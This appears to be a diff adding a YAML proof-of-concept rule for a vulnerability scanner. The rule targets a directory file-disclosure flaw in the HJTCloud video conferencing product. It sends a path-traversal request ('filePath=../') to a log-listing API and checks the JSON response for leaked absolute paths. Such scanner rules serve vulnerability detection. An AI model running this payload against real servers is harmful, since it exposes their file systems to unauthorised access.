@@ -1,0 +1,11 @@
+name: poc-yaml-hjtcloud-directory-file-leak
+rules:
+  - method: GET
+    path: "/him/api/rest/V1.0/system/log/list?filePath=../"
+    expression: |
+      response.status == 200 && response.content_type.contains("application/json") && response.body.bcontains(b"\"absolutePath\":\"/var/logs/")
+detail:
+  author: YekkoY
+  description: "会捷通云视讯 list 目录文件泄露漏洞"
+  links:
+    - http://wiki.peiqi.tech/PeiQi_Wiki/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E4%B8%AD%E5%88%9B%E8%A7%86%E8%BF%85/%E4%BC%9A%E6%8D%B7%E9%80%9A%E4%BA%91%E8%A7%86%E8%AE%AF%20list%20%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.html
